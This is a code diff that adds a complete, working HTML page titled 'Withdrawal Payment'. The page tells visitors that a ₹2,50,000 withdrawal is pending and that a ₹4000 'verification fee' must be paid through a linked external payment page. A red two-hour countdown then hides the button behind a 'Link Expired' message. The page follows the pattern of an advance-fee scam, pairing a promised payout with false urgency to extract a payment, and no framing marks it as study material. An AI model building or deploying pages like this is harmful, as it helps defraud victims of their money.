@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Withdrawal Payment</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f3f3f3;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 90%;
+    }
+    h1 {
+      color: #333;
+      margin-bottom: 15px;
+    }
+    p {
+      font-size: 18px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+    .btn {
+      margin-top: 20px;
+      padding: 12px 25px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .btn:hover {
+      background-color: #218838;
+    }
+    #countdown {
+      margin-top: 15px;
+      font-size: 16px;
+      color: #ff0000;
+    }
+    .expired {
+      color: red;
+      font-weight: bold;
+      margin-top: 20px;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Withdrawal Pending</h1>
+    <p>To process your withdrawal request of ₹2,50,000, please complete the verification fee of ₹4000.</p>
+    <a id="payBtn" class="btn" href="https://payments.cashfree.com/links?code=R8f4ueunbo20" target="_blank">Pay Now</a>
+    <div id="countdown"></div>
+    <div id="expiredMessage" class="expired" style="display:none;">Link Expired</div>
+  </div>
+
+  <script>
+    // 2 hours countdown in seconds
+    let countdownSeconds = 2 * 60 * 60;
+
+    function updateCountdown() {
+      let hours = Math.floor(countdownSeconds / 3600);
+      let minutes = Math.floor((countdownSeconds % 3600) / 60);
+      let seconds = countdownSeconds % 60;
+
+      document.getElementById('countdown').innerHTML = 
+        `Link expires in ${hours}h ${minutes}m ${seconds}s`;
+
+      if (countdownSeconds <= 0) {
+        clearInterval(timer);
+        document.getElementById('payBtn').style.display = 'none';
+        document.getElementById('countdown').style.display = 'none';
+        document.getElementById('expiredMessage').style.display = 'block';
+      }
+
+      countdownSeconds--;
+    }
+
+    updateCountdown(); // initial call
+    const timer = setInterval(updateCountdown, 1000);
+  </script>
+</body>
+</html>
